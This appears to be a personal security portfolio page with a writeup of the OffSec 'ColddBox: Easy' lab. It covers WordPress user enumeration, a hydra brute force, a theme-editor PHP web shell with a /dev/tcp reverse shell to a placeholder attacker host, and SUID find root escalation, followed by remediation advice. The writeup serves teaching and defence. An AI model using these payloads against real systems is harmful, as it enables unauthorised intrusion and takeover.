@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ColddBox: Easy — Writeup — Dos Vathanak Botra</title>
+<meta name="description" content="WordPress user enumeration and a brute-forced login lead to authenticated RCE via the theme editor, then a SUID find binary hands over root. An OffSec Proving Grounds writeup.">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=IBM+Plex+Mono:wght@300;400;500;600&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/base.css">
+<link rel="stylesheet" href="../../css/nav.css">
+<link rel="stylesheet" href="../../css/footer.css">
+<link rel="stylesheet" href="../../css/animations.css">
+<link rel="stylesheet" href="../../css/responsive.css">
+<link rel="stylesheet" href="../writeups.css">
+<link rel="stylesheet" href="../../css/fx.css">
+<script src="../../js/fx-head.js"></script>
+</head>
+<body>
+<div class="fx-cube-cap" aria-hidden="true"></div>
+
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <a href="../../index.html" class="nav-logo" aria-label="Status: Junior">
+    <span class="nav-logo-dot" aria-hidden="true"></span>
+    <span class="nav-logo-key">STATUS:</span>
+    <span class="nav-logo-val">JUNIOR</span>
+  </a>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="../../index.html#about">About</a></li>
+    <li><a href="../../index.html#skills">Skills</a></li>
+    <li><a href="../../index.html#experience">Experience</a></li>
+    <li><a href="../../index.html#certificates">Certs</a></li>
+    <li><a href="../index.html">Writeups</a></li>
+    <li><a href="../../index.html#contact">Contact</a></li>
+  </ul>
+  <div class="nav-right">
+    <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" aria-label="Toggle light and dark theme">
+      <span class="theme-toggle-label" id="themeLabel">Dark</span>
+      <span class="theme-toggle-track"><span class="theme-toggle-thumb"></span></span>
+    </button>
+    <div class="hamburger" id="hamburger" onclick="toggleMenu()">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<main class="wu-main">
+  <a href="../index.html" class="wu-back">← All writeups</a>
+
+  <div class="wu-report-head">
+    <span class="badge cat-web">Web</span>
+    <span class="diff diff-easy">Easy</span>
+  </div>
+  <h1 class="wu-page-title">ColddBox: Easy</h1>
+  <p class="wu-meta-line"><b>OffSec Proving Grounds</b> · Linux · WordPress · boot-to-root</p>
+
+  <!-- At a glance -->
+  <dl class="wu-glance reveal">
+    <div><dt>Vulnerability</dt><dd>User enum → brute-forced login → theme-editor RCE → SUID find</dd></div>
+    <div><dt>Impact</dt><dd>Full compromise — user and root flags captured (2/2)</dd></div>
+    <div><dt>Tools</dt><dd>nmap, gobuster, wpscan, hydra, curl, nc</dd></div>
+    <div><dt>Given</dt><dd>A single IP, no credentials</dd></div>
+  </dl>
+
+  <div class="wu-flag-wrap">
+    FLAGS&nbsp; <span class="wu-flag-redacted">✓ user + root captured — values redacted</span>
+  </div>
+
+  <!-- Cyber Kill Chain -->
+  <div class="wu-kill-chain">
+    <div class="wu-kill-chain-title">Cyber Kill Chain</div>
+    <div class="wu-chain">
+      <div class="wu-chain-box" data-phase="recon"><span class="step-name">Reconnaissance</span><span class="step-detail">nmap, gobuster, wpscan</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="credential"><span class="step-name">Credential Access</span><span class="step-detail">hydra brute-force</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="exploit"><span class="step-name">Exploitation</span><span class="step-detail">theme editor → PHP shell</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="privesc"><span class="step-name">Privilege Escalation</span><span class="step-detail">SUID find -exec</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="impact"><span class="step-name">Impact</span><span class="step-detail">root access</span></div>
+    </div>
+  </div>
+
+  <!-- MITRE ATT&CK Framework -->
+  <div class="wu-mitre-table">
+    <h2 style="border-left: 3px solid var(--green); padding-left: 0.85rem; color: var(--text); margin-bottom: 1rem;">MITRE ATT&CK Mapping</h2>
+    <table class="wu-table">
+      <thead>
+        <tr>
+          <th>Tactic</th>
+          <th>Technique</th>
+          <th>ID</th>
+          <th>Evidence</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>Discovery</strong></td>
+          <td>Account Discovery: Local Account</td>
+          <td><a href="https://attack.mitre.org/techniques/T1087/001/" target="_blank" style="color: var(--cyan);">T1087.001</a></td>
+          <td>wpscan's author-ID brute forcing enumerated three valid WordPress usernames</td>
+        </tr>
+        <tr>
+          <td><strong>Credential Access</strong></td>
+          <td>Brute Force: Password Guessing</td>
+          <td><a href="https://attack.mitre.org/techniques/T1110/001/" target="_blank" style="color: var(--cyan);">T1110.001</a></td>
+          <td>hydra ran a wordlist attack against <code>wp-login.php</code> and recovered the admin password</td>
+        </tr>
+        <tr>
+          <td><strong>Execution</strong></td>
+          <td>Server Software Component: Web Shell</td>
+          <td><a href="https://attack.mitre.org/techniques/T1505/003/" target="_blank" style="color: var(--cyan);">T1505.003</a></td>
+          <td>The authenticated theme editor was used to plant a PHP web shell / reverse shell in <code>404.php</code></td>
+        </tr>
+        <tr>
+          <td><strong>Privilege Escalation</strong></td>
+          <td>Exploitation for Privilege Escalation</td>
+          <td><a href="https://attack.mitre.org/techniques/T1068/" target="_blank" style="color: var(--cyan);">T1068</a></td>
+          <td>A SUID <code>find</code> binary spawned a root-owned shell via <code>-exec</code></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- Vulnerability Analysis -->
+  <div class="wu-vuln-analysis">
+    <h3>Vulnerability Analysis</h3>
+    <p><strong>Root Causes:</strong> A weak, shared WordPress password combined with a sanctioned admin feature (the theme editor) to give code execution, and a leftover SUID bit on <code>find</code> turned that into root.</p>
+    <ul style="color: var(--text2); margin-left: 1.3rem;">
+      <li><strong>CWE-521: Weak Password Requirements</strong> — the WordPress administrator password was a simple numeric string, crackable with a standard wordlist</li>
+      <li><strong>CWE-434: Unrestricted Upload of File with Dangerous Type</strong> — the built-in theme editor allows an authenticated admin to write arbitrary PHP straight into the webroot</li>
+      <li><strong>CWE-250: Execution with Unnecessary Privileges</strong> — <code>/usr/bin/find</code> carried the SUID bit with no legitimate admin workflow requiring it</li>
+    </ul>
+    <p style="margin-top: 1rem;"><strong>Severity:</strong> No CVSS score applies — these are configuration weaknesses on a lab host, not a scored vulnerability in a shipped product. The practical effect is unauthenticated-to-root compromise.</p>
+    <p><strong>References:</strong>
+      <br><a href="https://cwe.mitre.org/data/definitions/521.html" class="cve-link" target="_blank">CWE-521</a>
+      <a href="https://cwe.mitre.org/data/definitions/434.html" class="cve-link" target="_blank">CWE-434</a>
+      <a href="https://cwe.mitre.org/data/definitions/250.html" class="cve-link" target="_blank">CWE-250</a>
+    </p>
+  </div>
+
+  <div class="wu-body">
+
+    <h2>Summary</h2>
+    <p>ColddBox: Easy is a Linux host running an outdated WordPress install. A note left in an undisclosed
+    directory confirmed three real usernames, and a wordlist attack against <code>wp-login.php</code> cracked
+    the administrator's password. From the dashboard, the built-in theme editor doubles as a code-execution
+    primitive: overwriting a template file with PHP and loading it in a browser is enough to get a shell as
+    <code>www-data</code>. A SUID copy of <code>/usr/bin/find</code> left over on the box then handed over a
+    root shell in one command.</p>
+
+    <div class="wu-insight">
+      <p><strong>Key insight:</strong> nothing here is an exploit in the CVE sense — it's three sanctioned
+      features (login, theme editor, <code>find</code>) stacked without the access controls that are supposed
+      to sit around each of them.</p>
+    </div>
+
+    <h2>Recon</h2>
+    <p>A full TCP scan with service/version detection:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>nmap -sC -sV -p- -T4 &lt;target&gt;</code></pre>
+    </div>
+
+    <table class="wu-table">
+      <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
+      <tbody>
+        <tr><td>80</td><td>HTTP</td><td>Apache 2.4.18 (Ubuntu) — WordPress 4.1.31</td></tr>
+        <tr><td>4512</td><td>SSH</td><td>OpenSSH 7.2p2 (moved off the default port 22)</td></tr>
+      </tbody>
+    </table>
+
+    <p>Directory brute-forcing the webroot turned up a non-standard <code>/hidden/</code> path alongside the
+    usual WordPress files:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>gobuster dir -u http://&lt;target&gt;/ -w /usr/share/wordlists/dirb/common.txt -x txt,php</code></pre>
+    </div>
+
+    <p>That page held an internal note confirming three real accounts and that passwords were being shared
+    between them — a strong hint the login was worth attacking directly:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>text · /hidden/</span><button class="wu-copy">copy</button></div>
+<pre><code>C0ldd, you changed Hugo's password, when you can send it to him
+so he can continue uploading his articles. Philip</code></pre>
+    </div>
+
+    <h2>User enumeration</h2>
+    <p>wpscan's author-ID brute forcing confirmed the three usernames named in the note:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>wpscan --url http://&lt;target&gt;/ --enumerate u --random-user-agent
+# Valid usernames: c0ldd, hugo, philip</code></pre>
+    </div>
+
+    <div class="wu-insight">
+      <p><strong>Why this matters:</strong> an "internal" note served over plain HTTP with no auth is public.
+      It did the attacker's username enumeration for free.</p>
+    </div>
+
+    <h2>Credential access</h2>
+    <p><code>xmlrpc.php</code> returned a bare 500, ruling out the usual XML-RPC brute-force path, so the
+    attack went straight at <code>wp-login.php</code>. A quick probe found the exact string the form returns
+    on a bad password, which became hydra's failure condition:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>hydra -l c0ldd -P /usr/share/wordlists/rockyou.txt &lt;target&gt; \
+  http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:is incorrect" -t 16 -f
+# login: c0ldd   password: &lt;redacted&gt;</code></pre>
+    </div>
+
+    <p>wpscan's own password-attack mode against the same three usernames independently confirmed the
+    credential — <code>c0ldd</code>, a WordPress administrator.</p>
+
+    <h2>Initial access — theme editor RCE</h2>
+    <p>Authenticating as <code>c0ldd</code> and opening <strong>Appearance → Theme Editor</strong> exposes an
+    arbitrary-write primitive: any file in the active theme can be replaced with attacker-controlled PHP, then
+    requested directly to execute it. The replacement for <code>404.php</code> doubles as a passive web shell
+    and an automatic reverse shell:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>php · payload_404.php</span><button class="wu-copy">copy</button></div>
+<pre><code>&lt;?php if(isset($_GET['c'])){ system($_GET['c']); }
+exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/443 0&gt;&amp;1' &gt; /dev/null 2&gt;&amp;1 &amp;"); ?&gt;</code></pre>
+    </div>
+
+    <p>Submitted through the theme editor's update endpoint (with a fresh <code>_wpnonce</code> pulled from
+    the edit page) and then triggered with a single request:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>curl http://&lt;target&gt;/wp-content/themes/twentyfifteen/404.php?c=id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+    </div>
+
+    <p>The reverse shell lands on the listener a moment later — a foothold as <code>www-data</code>, with the
+    <code>?c=</code> parameter still available as a lightweight web shell for scripted commands.</p>
+
+    <h2>Privilege escalation — SUID find</h2>
+    <p>Enumerating SUID binaries from the foothold turned up a copy of <code>/usr/bin/find</code> with the
+    SUID bit set:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>find / -perm -4000 -type f 2&gt;/dev/null
+# ...
+# /usr/bin/find   &lt;=== SUID find (abusable)</code></pre>
+    </div>
+
+    <p>Per <a href="https://gtfobins.github.io/gtfobins/find/#suid" target="_blank">GTFOBins</a>, a SUID
+    <code>find</code> can spawn a shell that keeps the elevated effective UID via <code>-exec ... -p</code>:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>find /etc/hostname -exec /bin/sh -p \; -quit
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</code></pre>
+    </div>
+
+    <p><code>euid=0</code> — root achieved. The same primitive read both the user and root flag files, and the
+    WordPress database credentials out of <code>wp-config.php</code>.</p>
+
+    <h2>Findings &amp; remediation</h2>
+    <table class="wu-table">
+      <thead><tr><th>#</th><th>Finding</th><th>Severity</th><th>Remediation</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>Internal note publicly readable, confirming three usernames</td><td>Low</td><td>Never publish internal communication on a public web path</td></tr>
+        <tr><td>2</td><td>Weak, numeric WordPress admin password</td><td>High</td><td>Enforce password complexity; add login rate-limiting / lockout on <code>wp-login.php</code></td></tr>
+        <tr><td>3</td><td>Theme/plugin file editor enabled</td><td>High</td><td>Set <code>DISALLOW_FILE_EDIT</code> and <code>DISALLOW_FILE_MODS</code> in <code>wp-config.php</code></td></tr>
+        <tr><td>4</td><td>Outdated WordPress core (4.1.31)</td><td>Medium</td><td>Upgrade to a supported, patched release</td></tr>
+        <tr><td>5</td><td>SUID bit set on <code>/usr/bin/find</code></td><td>Critical</td><td><code>chmod u-s /usr/bin/find</code> — no standard workflow needs this</td></tr>
+      </tbody>
+    </table>
+
+    <h2>Takeaways</h2>
+    <ul>
+      <li><strong>Enumerate before guessing.</strong> The hidden note and author-ID brute forcing turned a
+      blind password attack into a targeted one against a single confirmed admin account.</li>
+      <li><strong>Admin features are attack surface too.</strong> The theme editor is a sanctioned WordPress
+      feature, not a bug — but in the wrong hands it's unauthenticated-adjacent RCE.</li>
+      <li><strong>SUID audits matter.</strong> A single leftover SUID bit on a common utility erased every
+      other control on the box.</li>
+    </ul>
+
+  </div>
+
+  <!-- References & Standards Alignment -->
+  <div class="wu-references">
+    <h3>References & Standards</h3>
+    <ul>
+      <li class="ref-category">MITRE Framework</li>
+      <li><a href="https://attack.mitre.org/" target="_blank">MITRE ATT&CK — Adversary Tactics, Techniques, and Common Knowledge</a></li>
+
+      <li class="ref-category">Common Weakness Enumeration</li>
+      <li><a href="https://cwe.mitre.org/data/definitions/521.html" target="_blank">CWE-521: Weak Password Requirements</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/434.html" target="_blank">CWE-434: Unrestricted Upload of File with Dangerous Type</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/250.html" target="_blank">CWE-250: Execution with Unnecessary Privileges</a></li>
+
+      <li class="ref-category">Security Guidance</li>
+      <li><a href="https://gtfobins.github.io/" target="_blank">GTFOBins — curated Unix binaries usable to bypass local security restrictions (relevant to the SUID find escalation)</a></li>
+      <li><a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10 — Most Critical Web Application Security Risks</a></li>
+      <li><a href="https://www.cisecurity.org/cis-benchmarks/" target="_blank">CIS Benchmarks — Security Configuration Standards</a></li>
+    </ul>
+  </div>
+</main>
+
+<footer>
+  <div class="footer-name">DOS VATHANAK BOTRA</div>
+  <div class="footer-copy">© 2025 Dos Vathanak Botra. All rights reserved. · Phnom Penh, Cambodia</div>
+  <div class="footer-links">
+    <a href="../../index.html#hero">Home</a>
+    <a href="../index.html">Writeups</a>
+    <a href="../../index.html#contact">Contact</a>
+  </div>
+</footer>
+
+<script src="../../js/theme.js"></script>
+<script src="../../js/nav.js"></script>
+<script src="../../js/fx.js"></script>
+<script src="../writeups.js"></script>
+<script src="../../js/analytics.js"></script>
+</body>
+</html>
